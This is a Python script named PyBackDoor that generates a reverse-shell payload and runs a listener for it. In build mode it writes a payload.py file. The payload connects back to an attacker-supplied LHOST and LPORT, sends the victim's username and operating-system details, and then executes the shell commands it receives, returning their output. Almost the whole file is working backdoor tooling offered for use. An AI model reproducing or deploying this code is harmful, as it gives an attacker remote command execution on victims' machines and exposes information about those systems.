import argparse
import subprocess
from socket import *
from modules.auto_type import s_print
from modules.pybackdoor_listen import pybackdoor_listen
# colors
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
# logo 
s_print(f'''{RED}
                      ██    █████
                     █▒▒█   █▒▒▒█
                    █▒▒▒▒█  █▒▒▒█
                  ██▒▒▒▒▒▒█ █▒▒▒█
                 █▒▒▒▒▒▒▒▒▒██▒▒▒█
                █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
               █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
             ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
            █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
           █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
         ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
        █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
       █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
      █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
     ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
      ██▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒██
       ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███
        ██▒▒▒▒▒██████▒▒▒▒████████▒▒▒██
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
         █▒▒▒▒▒██████▒▒▒▒████████▒▒▒█
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒████████▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
██████████▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███████
███████████████████████████████████████████
███████████░░░░░░██████████████████████████
███████░░░░░░██████████████████████████████
█████░░░░░░████████████████████████████████
█████░░░░░░████████████████████████████████
█████░░░░░░░░██████████████████████████████
██████░░░░░░░░░░░░█████████████████████████
████████░░░░░░░░░░░░░░░░███████████████████
███████████░░░░░░░░░░░░░░░░░░░█████████████
████████████████░░░░░░░░░░░░░░░░░░░████████
████████████████████░░░░░░░░░░░░░░░░░██████
███████████████████████░░░░░░░░░░░░░░░░████
█████████████████████████░░░░░░░░░░░░░░░░██
██████████████████████████░░░░░░░░░░░░░░░░█
███████████████████████████░░░░░░░░░░░░░░░█
███████████████████████████░░░░░░░░░░░░░░░█
██████████████████████████░░░░░░░░░░░░░░░██
█████████████████████████░░░░░░░░░░░░░░░░██
████████████████████████░░░░░░░░░░░░░░░░███
             PyBackDoor
  Developer: Dev. Gautam Kumar
''')
parser = argparse.ArgumentParser()        
parser.add_argument("-m", "--mode", type=str, help="Which mode or function to execute: build or listen")
parser.add_argument("-lh","--lhost",type=str, help="LHOST")
parser.add_argument("-lp","--lport",type=int, help="LPORT")
args = parser.parse_args()
lhost = args.lhost
lport = args.lport
if args.mode == "build":
    with open("payload.py","w") as payload_file:
        payload = "from socket import *\nfrom getpass import getuser\nimport subprocess\nimport platform\nimport os\n# fetch victim information\n\nget_os = platform = platform.uname()\n\nget_user = getuser()\n\nos_info = 'client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)\n# Lhost and lport\n\nHOST = '"+lhost+"'\n\nPORT = "+str(lport)+"\n# connection configuration\n\nconnection = socket(AF_INET, SOCK_STREAM)\n\nconnection.connect((HOST, PORT))\n\nconnection.send(os_info.encode())\n# payload execution\n\nwhile True:\n    receiver = connection.recv(1024).decode()\n    if receiver == 'exit':\n        exit()\n    elif receiver[:2] == 'cd':\n        os.chdir(receiver[3:])\n        connection.send(os.getcwd().encode())\n    else:\n        out_put = subprocess.getoutput(receiver)\n        if out_put =='' or out_put == None:\n            output='----'\n            connection.send(out_put.encode())\n        else:\n            connection.send(out_put.encode())"
        payload_file.write(payload)
        print("Payload file created")
elif args.mode == "listen":
    print(pybackdoor_listen(lhost,lport))
else:
    print(
        '''
        usage: pybackdoor.py [-h] [-m MODE] [-lh LHOST] [-lp LPORT]

options:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  Which mode or function to execute: build or listen
  -lh LHOST, --lhost LHOST
                        LHOST
  -lp LPORT, --lport LPORT
                        LPORT
    ''')